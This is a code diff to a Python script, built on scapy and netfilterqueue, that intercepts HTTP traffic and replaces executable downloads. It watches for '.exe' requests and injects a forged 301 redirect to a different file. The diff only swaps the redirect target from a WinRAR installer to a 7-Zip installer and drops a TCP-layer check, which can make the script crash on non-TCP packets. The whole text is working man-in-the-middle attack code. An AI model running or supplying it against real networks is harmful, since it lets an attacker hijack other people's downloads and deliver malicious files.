@@ -12,7 +12,7 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+    if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             #print("Http Request")
             if ".exe" in scapy_packet[scapy.Raw].load:
@@ -23,9 +23,8 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-571sc.exe\n\n") 
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z1900.exe\n\n") 
                 packet.set_payload(str(modified_packet))
-
     packet.accept()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
